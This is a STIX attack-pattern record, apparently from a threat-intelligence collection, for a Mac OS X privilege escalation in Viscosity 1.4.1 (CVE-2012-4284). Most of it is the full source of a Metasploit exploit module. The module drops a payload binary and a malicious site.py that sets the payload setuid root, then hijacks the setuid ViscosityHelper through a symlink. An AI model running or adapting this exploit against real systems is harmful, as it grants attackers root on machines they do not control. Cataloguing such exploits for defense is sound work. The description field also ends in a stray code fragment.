{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b17f152-c0a4-493f-b30d-17cee23557e9",
    "created": "2024-08-14T16:34:40.251726Z",
    "modified": "2024-08-14T16:34:40.25173Z",
    "name": "Viscosity setuid-set ViscosityHelper Privilege Escalation",
    "description": " This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The vulnerability exists in the setuid ViscosityHelper, where an insufficient validation of path names allows execution of arbitrary python code as root. This module has been tested successfully on Viscosity 1.4.1 over Mac OS X 10.7.5.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/setuid_viscosity.rb",
            "external_id": "setuid_viscosity.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.zx2c4.com/791"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::OSX::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super( update_info( info, {\n        'Name'           => 'Viscosity setuid-set ViscosityHelper Privilege Escalation',\n        'Description'    => %q{\n            This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The\n          vulnerability exists in the setuid ViscosityHelper, where an insufficient\n          validation of path names allows execution of arbitrary python code as root.\n          This module has been tested successfully on Viscosity 1.4.1 over Mac OS X\n          10.7.5.\n        },\n        'References'     =>\n          [\n            [ 'CVE', '2012-4284' ],\n            [ 'OSVDB', '84709' ],\n            [ 'EDB', '20485' ],\n            [ 'URL', 'http://blog.zx2c4.com/791' ]\n          ],\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'Jason A. Donenfeld', # Vulnerability discovery and original Exploit\n            'juan vazquez'        # Metasploit module\n          ],\n        'DisclosureDate' => '2012-08-12',\n        'Platform'       => 'osx',\n        'Arch'           => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes'   => [ 'shell' ],\n        'Targets'        =>\n          [\n            [ 'Viscosity 1.4.1 / Mac OS X x86',    { 'Arch' => ARCH_X86 } ],\n            [ 'Viscosity 1.4.1 / Mac OS X x64',    { 'Arch' => ARCH_X64 } ]\n          ],\n        'DefaultOptions' => { \"PrependSetresuid\" => true, \"WfsDelay\" => 2 },\n        'DefaultTarget' => 0\n      }))\n    register_options [\n      # These are not OptPath because it's a *remote* path\n      OptString.new(\"WritableDir\", [ true, \"A directory where we can write files\", \"/tmp\" ]),\n      OptString.new(\"Viscosity\",   [ true, \"Path to setuid ViscosityHelper executable\", \"/Applications/Viscosity.app/Contents/Resources/ViscosityHelper\" ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    unless file? datastore['Viscosity']\n      vprint_error 'ViscosityHelper not found'\n      return CheckCode::Safe\n    end\n\n    check = cmd_exec(\"find  #{datastore[\"Viscosity\"]} -type f -user root -perm -4000\")\n\n    unless check.include? 'ViscosityHelper'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def clean\n    file_rm(@link)\n    file_rm(@python_file)\n    file_rm(\"#{@python_file}c\")\n    file_rm(@exe_file)\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    exe_name = rand_text_alpha(8)\n    @exe_file = \"#{base_dir}/#{exe_name}\"\n    print_status(\"Dropping executable #{@exe_file}\")\n    write_file(@exe_file, generate_payload_exe)\n\n    evil_python =<<-EOF\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system(\"chown root #{@exe_file}\")\nos.system(\"chmod 6777 #{@exe_file}\")\nos.execl(\"#{@exe_file}\", \"#{exe_name}\")\n    EOF\n\n    @python_file = \"#{base_dir}/site.py\"\n    print_status(\"Dropping python #{@python_file}...\")\n    write_file(@python_file, evil_python)\n\n    print_status(\"Creating symlink...\")\n    link_name = rand_text_alpha(8)\n    @link = \"#{base_dir}/#{link_name}\"\n    cmd_exec \"ln -s -f -v #{datastore[\"Viscosity\"]} #{@link}\"\n\n    print_status(\"Running...\")\n    begin\n      cmd_exec \"#{@link}\"\n    rescue\n      print_error(\"Failed. Cleaning files #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}...\")\n      clean\n      return\n    end\n    print_warning(\"Remember to clean files: #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}\")\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-08-12",
    "x_mitre_platforms": [
        "osx'"
    ]
}